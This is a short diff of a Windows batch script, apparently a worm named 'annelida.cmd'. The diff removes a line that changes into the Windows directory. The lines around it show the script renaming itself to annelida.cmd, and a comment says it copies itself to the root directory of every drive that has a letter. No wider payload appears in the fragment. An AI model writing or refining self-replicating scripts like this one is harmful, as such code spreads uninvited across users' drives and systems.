@@ -62,8 +62,6 @@ set /a currentIteration=currentIteration+1
 
 if not exist "%annelida.cmd%" move "%~n0%~x0" annelida.cmd
 
-cd "%windir%"
-
 
 %= Copies to the root directory of all drives which have assigned letters =%
 set alphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZ
